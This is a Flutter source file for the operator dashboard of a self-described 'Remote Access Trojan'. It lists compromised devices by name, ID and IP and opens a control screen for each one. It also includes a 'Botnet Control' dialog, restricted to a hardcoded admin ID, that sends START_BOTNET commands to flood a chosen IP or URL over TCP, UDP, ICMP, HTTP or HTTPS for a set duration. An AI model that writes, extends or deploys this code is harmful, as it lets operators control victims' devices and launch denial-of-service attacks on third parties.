import 'dart:async';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:provider/provider.dart';
import 'api_service.dart';
import 'device_card.dart';
import 'device_control_screen.dart';
import '../widgets/glass_theme.dart';
import '../theme_provider.dart';

// ============================================================
// GRID PATTERN PAINTER
// ============================================================
class _RatGridPatternPainter extends CustomPainter {
  final Color gridColor;
  final double spacing;
  
  const _RatGridPatternPainter({
    required this.gridColor,
    this.spacing = 25,
  });
  
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = gridColor
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;
    
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }
  
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

// ── Design tokens ────────────────────────────────────────────────────────────
const _kRed      = Colors.redAccent;
const _kTextSub  = Colors.white70;

class RatDashboardScreen extends StatefulWidget {
  final String sessionKey;
  final String uId;
  const RatDashboardScreen({super.key, required this.sessionKey, required this.uId});

  @override
  State<RatDashboardScreen> createState() => _RatDashboardScreenState();
}

class _RatDashboardScreenState extends State<RatDashboardScreen>
    with SingleTickerProviderStateMixin {
  late RatApiService _apiService;
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;
  final _searchCtrl = TextEditingController();
  String _searchQuery = '';
  late AnimationController _fadeCtrl;
  late Animation<double> _fadeAnim;

  @override
  void initState() {
    super.initState();
    _apiService = RatApiService(widget.sessionKey);
    _fadeCtrl = AnimationController(
        duration: const Duration(milliseconds: 600), vsync: this);
    _fadeAnim = CurvedAnimation(parent: _fadeCtrl, curve: Curves.easeOut);
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 12), (_) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    _searchCtrl.dispose();
    _fadeCtrl.dispose();
    super.dispose();
  }

  Widget _buildGridBackground() {
    return Positioned.fill(
      child: CustomPaint(
        painter: _RatGridPatternPainter(
          gridColor: Colors.white.withOpacity(0.03),
          spacing: 30,
        ),
      ),
    );
  }

  Future<void> _fetchDevices() async {
    try {
      final devices = await _apiService.getDevices();
      if (mounted) {
        setState(() {
          _devices = devices;
          _isLoading = false;
        });
        _fadeCtrl.forward(from: 0);
      }
    } catch (e) {
      if (mounted) {
        setState(() => _isLoading = false);
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Connection Error: $e'),
            backgroundColor: _kRed,
            behavior: SnackBarBehavior.floating,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            margin: const EdgeInsets.all(16),
          ),
        );
      }
    }
  }

  List<dynamic> get _filtered {
    if (_searchQuery.isEmpty) return _devices;
    final q = _searchQuery.toLowerCase();
    return _devices.where((d) {
      final name  = (d['phoneName'] ?? d['hostname'] ?? '').toString().toLowerCase();
      final id    = (d['id'] ?? '').toString().toLowerCase();
      final ip    = (d['ipAddress'] ?? d['ip_address'] ?? '').toString().toLowerCase();
      return name.contains(q) || id.contains(q) || ip.contains(q);
    }).toList();
  }

  int get _online => _devices.where((d) => d['status'] == 'online').length;

  // ── Botnet dialog ─────────────────────────────────────────────────────────
  void _showBotnetDialog() {
    final targetCtrl   = TextEditingController();
    final durationCtrl = TextEditingController(text: '60');
    String method = 'TCP';

    showDialog(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setD) => AlertDialog(
          backgroundColor: Colors.black.withOpacity(0.85),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: _kRed.withOpacity(0.5)),
          ),
          title: Row(children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: _kRed.withOpacity(0.1),
                border: Border.all(color: _kRed.withOpacity(0.3)),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Icon(FontAwesomeIcons.boltLightning, color: Colors.white, size: 16),
            ),
            const SizedBox(width: 12),
            const Text('Botnet Control',
                style: TextStyle(color: Colors.white, fontSize: 17, fontWeight: FontWeight.w700)),
          ]),
          content: Column(mainAxisSize: MainAxisSize.min, children: [
            _dialogField(targetCtrl, 'Target (IP:Port / URL)', Icons.gps_fixed),
            const SizedBox(height: 12),
            _dialogField(durationCtrl, 'Duration (seconds)', Icons.timer, isNumber: true),
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.4),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _kRed.withOpacity(0.25)),
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  value: method,
                  isExpanded: true,
                  style: const TextStyle(color: Colors.white),
                  icon: const Icon(Icons.expand_more, color: _kRed),
                  dropdownColor: Colors.black.withOpacity(0.9),
                  items: ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS']
                      .map((m) => DropdownMenuItem(value: m, child: Text(m)))
                      .toList(),
                  onChanged: (v) => setD(() => method = v!),
                ),
              ),
            ),
          ]),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('Cancel', style: TextStyle(color: _kTextSub)),
            ),
            TextButton(
              onPressed: () async {
                await _apiService.broadcastBotnet('STOP_BOTNET');
                if (mounted) Navigator.pop(ctx);
              },
              child: const Text('Stop All', style: TextStyle(color: _kRed)),
            ),
            Container(
              decoration: BoxDecoration(
                color: _kRed.withOpacity(0.2),
                border: Border.all(color: _kRed.withOpacity(0.5)),
                borderRadius: BorderRadius.circular(10),
              ),
              child: TextButton(
                onPressed: () async {
                  final t = targetCtrl.text.trim();
                  final d = int.tryParse(durationCtrl.text) ?? 60;
                  if (t.isEmpty) return;
                  await _apiService.broadcastBotnet('START_BOTNET', args: '$t;$d;$method');
                  if (mounted) Navigator.pop(ctx);
                },
                child: const Text('Launch',
                    style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _dialogField(TextEditingController c, String hint, IconData icon,
      {bool isNumber = false}) {
    return TextField(
      controller: c,
      keyboardType: isNumber ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: Colors.white),
      decoration: InputDecoration(
        hintText: hint,
        hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 13),
        filled: true,
        fillColor: Colors.black.withOpacity(0.4),
        contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
        border:         OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
        enabledBorder:  OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _kRed.withOpacity(0.2))),
        focusedBorder:  OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: _kRed, width: 1.5)),
        prefixIcon: Icon(icon, color: _kRed, size: 18),
      ),
    );
  }

  // ── Build ─────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Consumer<ThemeProvider>(
      builder: (context, theme, child) {
        return Scaffold(
          backgroundColor: Colors.transparent,
          body: Stack(
            children: [
              _buildGridBackground(),
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [
                      Colors.black.withOpacity(0.85),
                      theme.primaryColor.withOpacity(0.05),
                      Colors.black.withOpacity(0.9)
                    ],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                ),
              ),
              SafeArea(
                child: Column(
                  children: [
                    _buildAppBar(theme),
                    _buildStatsBar(theme),
                    _buildSearchBar(theme),
                    Expanded(child: _buildDeviceList(theme)),
                  ],
                ),
              ),
            ],
          ),
          floatingActionButton: widget.uId == 'admin-e06652bc-88b5-4936-a3dd-9af1a788c0d2'
              ? _buildBotnetFab()
              : null,
        );
      },
    );
  }

  // ── App bar ───────────────────────────────────────────────────────────────
  Widget _buildAppBar(ThemeProvider theme) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 0),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: theme.primaryColor.withOpacity(0.1),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: theme.primaryColor.withOpacity(0.3)),
              boxShadow: [
                BoxShadow(color: theme.primaryColor.withOpacity(0.2), blurRadius: 10)
              ],
            ),
            child: Icon(
              FontAwesomeIcons.biohazard,
              color: theme.primaryColor,
              size: 20,
            ),
          ),
          const SizedBox(width: 12),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'Remote Access Trojan',
                style: TextStyle(
                  color: theme.textPrimaryColor,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Rajdhani',
                  letterSpacing: 0.5,
                ),
              ),
              Text(
                'Device Management & Control',
                style: TextStyle(
                  color: theme.textSecondaryColor,
                  fontSize: 12,
                  fontFamily: 'Rajdhani',
                ),
              ),
            ],
          ),
          const Spacer(),
          IconButton(
            icon: Icon(Icons.refresh_rounded, color: theme.textSecondaryColor),
            onPressed: _fetchDevices,
            tooltip: 'Refresh',
          ),
        ],
      ),
    );
  }

  // ── Stats bar ─────────────────────────────────────────────────────────────
  Widget _buildStatsBar(ThemeProvider theme) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 0),
      child: Row(
        children: [
          _statChip('${_devices.length}', 'Total', theme.primaryColor, theme),
          const SizedBox(width: 10),
          _statChip('$_online', 'Online', theme.successColor, theme),
          const SizedBox(width: 10),
          _statChip('${_devices.length - _online}', 'Offline', theme.textHintColor, theme),
        ],
      ),
    );
  }

  Widget _statChip(String value, String label, Color color, ThemeProvider theme) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12),
        decoration: BoxDecoration(
          color: theme.glassPrimary,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: theme.glassBorder),
          boxShadow: [
            BoxShadow(color: Colors.black.withOpacity(0.4), blurRadius: 8)
          ],
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(
                color: color,
                fontSize: 22,
                fontWeight: FontWeight.w800,
                fontFamily: 'Rajdhani',
              ),
            ),
            const SizedBox(height: 2),
            Text(
              label,
              style: TextStyle(
                color: theme.textSecondaryColor,
                fontSize: 11,
                fontFamily: 'Rajdhani',
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── Search bar ────────────────────────────────────────────────────────────
  Widget _buildSearchBar(ThemeProvider theme) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 14, 20, 0),
      child: TextField(
        controller: _searchCtrl,
        style: TextStyle(color: theme.textPrimaryColor, fontSize: 14, fontFamily: 'Rajdhani'),
        onChanged: (v) => setState(() => _searchQuery = v),
        decoration: InputDecoration(
          hintText: 'Search device, IP, ID...',
          hintStyle: TextStyle(color: theme.textHintColor, fontSize: 13, fontFamily: 'Rajdhani'),
          filled: true,
          fillColor: theme.glassSecondary,
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 13),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: BorderSide.none,
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: BorderSide(color: theme.glassBorder),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: BorderSide(color: theme.primaryColor, width: 1.5),
          ),
          prefixIcon: Icon(Icons.search_rounded, color: theme.textHintColor, size: 20),
          suffixIcon: _searchQuery.isNotEmpty
              ? IconButton(
                  icon: Icon(Icons.close_rounded, color: theme.textSecondaryColor, size: 18),
                  onPressed: () => setState(() { _searchCtrl.clear(); _searchQuery = ''; }),
                )
              : null,
        ),
      ),
    );
  }

  // ── Device list ───────────────────────────────────────────────────────────
  Widget _buildDeviceList(ThemeProvider theme) {
    if (_isLoading) {
      return Center(
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: theme.primaryColor.withOpacity(0.1),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: theme.primaryColor.withOpacity(0.3)),
              boxShadow: [
                BoxShadow(color: theme.primaryColor.withOpacity(0.2), blurRadius: 20)
              ],
            ),
            child: CircularProgressIndicator(
              color: theme.primaryColor,
              strokeWidth: 3,
            ),
          ),
          const SizedBox(height: 16),
          Text(
            'Scanning devices...',
            style: TextStyle(
              color: theme.textSecondaryColor,
              fontFamily: 'Rajdhani',
            ),
          ),
        ]),
      );
    }

    final list = _filtered;

    if (list.isEmpty) {
      return Center(
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: theme.glassPrimary,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: theme.glassBorder),
            ),
            child: Icon(
              FontAwesomeIcons.satelliteDish,
              size: 56,
              color: theme.textHintColor,
            ),
          ),
          const SizedBox(height: 16),
          Text(
            'No devices found',
            style: TextStyle(
              color: theme.textPrimaryColor,
              fontSize: 16,
              fontWeight: FontWeight.bold,
              fontFamily: 'Rajdhani',
            ),
          ),
          const SizedBox(height: 6),
          Text(
            'Waiting for connections...',
            style: TextStyle(
              color: theme.textSecondaryColor,
              fontSize: 13,
              fontFamily: 'Rajdhani',
            ),
          ),
        ]),
      );
    }

    return FadeTransition(
      opacity: _fadeAnim,
      child: ListView.builder(
        padding: const EdgeInsets.symmetric(vertical: 12),
        physics: const BouncingScrollPhysics(),
        itemCount: list.length,
        itemBuilder: (ctx, i) {
          final device = list[i];
          return TweenAnimationBuilder<double>(
            duration: Duration(milliseconds: 300 + i * 40),
            curve: Curves.easeOut,
            tween: Tween(begin: 0.0, end: 1.0),
            builder: (ctx, v, child) => Transform.translate(
              offset: Offset(0, 20 * (1 - v)),
              child: Opacity(opacity: v, child: child),
            ),
            child: RatDeviceCard(
              device: device,
              onTap: () => Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (_) => RatDeviceControlScreen(
                    deviceId: device['id'],
                    deviceModel: device['model'] ?? device['os'] ?? 'Unknown',
                    deviceName: device['phoneName'] ?? device['hostname'] ?? 'Unknown Device',
                    sessionKey: widget.sessionKey,
                  ),
                ),
              ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildBotnetFab() {
    return Consumer<ThemeProvider>(
      builder: (context, theme, child) {
        return Container(
          decoration: BoxDecoration(
            color: theme.errorColor.withOpacity(0.15),
            border: Border.all(color: theme.errorColor.withOpacity(0.4)),
            borderRadius: BorderRadius.circular(16),
            boxShadow: [
              BoxShadow(color: theme.errorColor.withOpacity(0.2), blurRadius: 16, spreadRadius: 2)
            ],
          ),
          child: FloatingActionButton.extended(
            onPressed: _showBotnetDialog,
            backgroundColor: Colors.transparent,
            elevation: 0,
            icon: Icon(FontAwesomeIcons.boltLightning, color: theme.errorColor, size: 18),
            label: Text(
              'Botnet',
              style: TextStyle(
                color: theme.textPrimaryColor,
                fontWeight: FontWeight.w700,
                fontFamily: 'Rajdhani',
              ),
            ),
          ),
        );
      },
    );
  }
}